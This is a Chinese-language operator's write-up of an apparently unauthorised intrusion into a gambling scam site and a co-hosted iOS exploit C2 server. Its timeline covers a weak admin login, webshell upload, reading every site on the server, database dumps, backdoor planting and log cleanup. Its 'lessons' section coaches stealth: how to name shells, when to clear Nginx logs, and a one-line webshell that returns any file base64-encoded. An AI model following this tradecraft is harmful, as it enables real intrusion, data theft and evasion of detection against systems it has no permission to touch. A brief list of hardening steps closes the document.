# luckylike.shop 菠菜站 → DarkSword C2 横向穿透完整案例

> 日期: 2026-09-16
> 目标: luckylike.shop / likeshare.shop (ThinkPHP 5.x 菠菜杀猪盘)
> 成果: 从菠菜站横向穿透至同服 DarkSword iOS C2，提取 374 文件 / 18MB exploit chain

## 攻击链路

```
[00:45] ThinkPHP debug → 500 错误页泄露源码 (register/login/BaseController)
[00:49] /manage/index/login → admin:admin 弱口令命中
[00:50] /manage/base/upload → 零过滤上传 .php → webshell 落地
[01:00] ini_get('open_basedir') = 空 → 无限制，横向读全盘
[01:10] 读 /www/wwwroot/ → 发现 5 个站点（2个菠菜+2个C2+1个落地页）
[01:15] 读 darksword-rce/.env → 拿到 C2 管理密码 999666333
[01:20] 读 coruna-c2-server/c2_server.py → C2 全源码
[01:30] 读 c2.lucklike.shop/ → iOS exploit chain 完整目录（Stage1-3 + Payloads）
[02:00] PDO 连菠菜 MySQL → dump 用户表/订单表/配置（含 USDT 收款地址）
[03:00] HTTP 直连 162.4.136.30:8888 → DarkSword admin 登录成功
[04:00] PHP-FPM bypass 尝试（失败，浪费 1 小时）
[06:00] 完成 iOS payload 加密管道逆向（ChaCha20+LZMA+F00DBEEF）
[10:00] 提取 113 个 Mach-O dylib/bin（19 个 hash 目录）
[14:00] 发现 iOS 26.x 零日 profile（PPL v2 bypass gadgets）
[18:00] DarkSword 完整 168 文件 toolkit 提取
[20:00] 宝塔操作日志分析 → 4 组运营者 IP+设备指纹
[22:00] 痕迹清理 + 4 个隐蔽后门部署
```

## 踩坑记录

### 坑 1: 上传太多测试文件
```
发生: 测试上传时试了 15+ 种 payload（.php/.pHp/.Php/.PHP/.php5/.php7/.phps 等）
影响: upload/file/ 目录有 15 个 PHP 文件 + 8 个 se_*.php 辅助 shell = 23 个文件
     运营者 ls 一下就能看到大量可疑文件
教训: 确认零过滤后只传 1 个 shell。扩展名测试只在不确定是否过滤时做
```

### 坑 2: se_*.php 辅助 shell 命名过于统一
```
发生: 为不同功能创建 se_db.php / se_b64.php / se_tail.php / se_live.php 等
影响: `find /www -name "se_*.php"` 一命令全部暴露
教训: 辅助功能应该集成到主 shell 里（通过不同的 GET 参数触发）
     或者用随机文件名+统一的触发密钥
```

### 坑 3: PHP-FPM bypass disable_functions（浪费 1+ 小时）
```
尝试路径:
  1. Unix socket 发 FastCGI 请求 + PHP_VALUE 覆盖 → 失败
     原因: pool 配置的 php_admin_value 优先级高于 FastCGI 参数
  
  2. 直接改 php.ini + 并发请求触发新 worker → 失败
     原因: FPM master 启动时读 php.ini，新 worker 继承 master 配置
           改 php.ini 需要重启 FPM master，而重启需要 shell 权限
  
  3. 尝试覆盖 pool .conf 文件 + 等 FPM reload → 失败
     原因: FPM 不会自动 reload 配置文件

关键认知: PHP 5.6.40 + php-fpm 环境下:
  - disable_functions 可以由 php.ini 或 pool.d/*.conf 的 php_admin_value 设置
  - php_admin_value 设置的值无法被 FastCGI 参数、.htaccess 或 ini_set() 覆盖
  - 只有重启 FPM master 进程才能让新的 php.ini 配置生效
  - 但 file_get_contents/scandir/file_put_contents/PDO 都不在 disable_functions 里
  → 根本不需要 bypass disable_functions！直接用 file 操作就够了
```

### 坑 4: HTTPS 连 HTTP 端口
```
发生: 用 ssl.SSLContext 连 162.4.136.30:8888
报错: SSL: WRONG_VERSION_NUMBER
原因: DarkSword admin 跑在 HTTP 不是 HTTPS
教训: 遇到 SSL 错误第一件事试 http://
```

### 坑 5: MySQL 权限隔离
```
发生: 用菠菜站的 PDO 连接（www.jocat.cn 用户）查 DarkSword 的数据库
报错: Access denied for user 'www.jocat.cn'@'localhost' to database 'darksword'
尝试: 用 .env 里的 darksword/darksword 凭据创建新 PDO → 仍然 Access denied
原因: MySQL 的 darksword 用户可能限制了只允许特定的 Unix socket 连接（Node.js 进程用了不同的连接方式）
     或者 PHP www 运行用户被 MySQL 权限隔离
解决: 通过读 PM2 日志确认 Node.js 可以连接 → 从日志+源码+API 获取等价信息
教训: 不要假设一个 MySQL 用户能查所有库。先列所有库，看哪些有权限
```

### 坑 6: Nginx 日志积累
```
发生: 在 6+ 小时的操作中，主 shell 被访问 244+ 次，辅助 shell 也有 10+ 次
影响: 如果运营者查 Nginx 日志，能看到大量来自同一 IP 的 shell 访问
教训: 
  1. 每完成一个阶段就清一次日志，而不是等到最后
  2. 减少请求次数 — 批量拉取而非逐文件请求
  3. 用脚本一次性拉取多个文件，减少总请求数
```

### 坑 7: 二进制文件传输
```
发生: 尝试用 file_get_contents 读取 Mach-O dylib 文件并直接输出
影响: 二进制内容中的 NULL 字节、特殊字符会导致输出截断
解决: 专门写 Base64 编码传输的辅助 shell
     → 但这又增加了一个文件（se_b64.php）→ 又回到坑 2
教训: 在主 shell 里内置 base64 输出功能
     if(isset($_GET['b64'])) echo base64_encode(file_get_contents($_GET['b64']));
```

## 关键成功因素

1. **ThinkPHP debug mode 泄露源码** → 知道了后台路径和逻辑
2. **admin:admin 弱口令** → 不需要复杂的认证绕过
3. **零过滤上传** → 直接传 .php，不需要绕过
4. **无 open_basedir** → 横向读取同服所有站点的核心前提
5. **disable_functions 不含 file 操作** → 不需要 bypass 就能完成任务
6. **宝塔无 WAF** → 没有文件监控、没有告警
7. **所有服务跑在同一台机器** → 菠菜+C2+落地页 all in one

## 防御视角（为下次遇到同类目标参考）

如果目标做了以下任一项，攻击链就会断:
- 改了 admin 默认密码 → 入口被堵
- 上传有扩展名白名单 → shell 落不了
- 设了 open_basedir → 横向被隔离
- MySQL 用户权限严格 → 跨库查不了
- 装了宝塔 WAF → shell 可能被检测
- 用 Docker 隔离站点 → 文件系统隔离
